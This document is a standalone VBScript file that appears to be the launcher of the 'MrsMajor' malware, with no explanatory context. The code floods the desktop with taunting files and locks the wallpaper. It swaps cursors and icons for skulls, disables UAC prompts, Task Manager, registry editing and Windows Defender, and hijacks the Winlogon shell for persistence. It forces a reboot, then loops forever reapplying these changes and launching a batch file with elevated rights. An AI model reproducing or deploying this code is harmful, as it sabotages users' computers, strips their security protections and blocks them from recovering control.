set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")
set objShell=createobject("Shell.Application")
on error resume next

dim tmp : tmp=x.expandenvironmentstrings("%TEMP%")
dim dsk : dsk=x.specialfolders("DESKTOP")
dim ke : ke="C:\Program Files\mrsmajor"
c.CopyFile""&ke&"\def_resource\@Tile@@.jpg", ""&tmp&"\"






if c.fileexists(""&ke&"\Doll_patch.xml") then
else
c.CreateTextFile""&ke&"\Doll_patch.xml"
for nexfil=1 to 50
set p=c.CreateTextFile(""&dsk&"\MRS MAJOR WANTS TO MEET YOU                  "&nexfil&".txt")
p.write"MRS MAJOR IS BEHIND OF YOU!"
p.close
next
x.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system\wallpaper",""&tmp&"\@tile@@.jpg","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop\NoChangingWallPaper","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\Control Panel\Cursors\Arrow",""&ke&"\def_resource\skullcur.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\AppStarting",""&ke&"\def_resource\skullcur.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\Hand",""&ke&"\def_resource\skullcur.cur","REG_SZ"
x.RegWrite"HKCR\txtfile\DefaultIcon\",""&ke&"\Icon_resource\SkullIco.ico","REG_SZ"
x.RegWrite"HKCR\exefile\DefaultIcon\",""&ke&"\Icon_resource\SkullIco.ico","REG_SZ"
x.RegWrite"HKCR\mp3file\DefaultIcon\",""&ke&"\Icon_resource\SkullIco.ico","REG_SZ"
x.RegWrite"HKCR\mp4file\DefaultIcon\",""&ke&"\Icon_resource\SkullIco.ico","REG_SZ"
x.RegWrite"HKCR\inifile\DefaultIcon\",""&ke&"\Icon_resource\SkullIco.ico","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe, wscript.exe ""C:\Program Files\mrsmajor\Launcher.vbs""","REG_SZ"
x.run "wmplayer.exe """&ke&"\def_resource\f11.mp4"""
wscript.sleep 3500
x.sendkeys"{F11}"
wscript.sleep 5000
x.run "shutdown.exe -r -t 03",0
msgbox"MrsMajor Wants TO MEET YOU!",1+48,"Cute Doll!"
wscript.quit
end if

















x.run "wmplayer.exe """&ke&"\def_resource\creepysound.mp3""",0



























dim mus
mus=0
dim tkil
tkil=0


do
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.RegWrite"HKCU\Control Panel\Cursors\Arrow",""&ke&"\def_resource\skullcur.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\AppStarting",""&ke&"\def_resource\skullcur.cur","REG_SZ"
x.RegWrite"HKCU\Control Panel\Cursors\Hand",""&ke&"\def_resource\skullcur.cur","REG_SZ"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
x.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware","1","REG_DWORD"
x.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe, wscript.exe ""C:\Program Files\mrsmajor\Launcher.vbs""","REG_SZ"

mus=mus+1

wscript.sleep 2000


tkil=tkil+1

if tkil=4 then
tkil=0
objshell.shellexecute""&ke&"\DreS_X.bat",,,"runas",0  
end if




if mus=35 then
x.run "wmplayer.exe """&ke&"\def_resource\creepysound.mp3""",0
mus=0
end if






loop






































